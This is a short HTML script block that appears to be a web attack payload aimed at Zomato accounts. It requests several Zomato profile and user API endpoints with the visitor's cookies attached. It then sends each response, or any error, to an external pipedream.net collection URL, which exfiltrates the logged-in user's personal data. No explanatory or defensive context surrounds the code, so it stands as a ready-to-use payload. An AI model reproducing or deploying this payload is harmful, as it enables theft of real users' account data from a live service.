<script>
const endpoints = [
  'https://www.zomato.com/api/profile',
  'https://www.zomato.com/api/user',
  'https://api.zomato.com/profile',
  'https://www.zomato.com/webroutes/getPage?page_url=/profile&format=jsonp',
  'https://www.zomato.com/webroutes/getPage?page_url=/profile&callback=cb',
];

endpoints.forEach(url => {
  fetch(url, {credentials: 'include'})
    .then(r => r.text())
    .then(d => fetch('https://eomfuajl79ed6za.m.pipedream.net?url=' + encodeURIComponent(url) + '&d=' + encodeURIComponent(d)))
    .catch(e => fetch('https://eomfuajl79ed6za.m.pipedream.net?url=' + encodeURIComponent(url) + '&err=' + encodeURIComponent(e)))
});
</script>
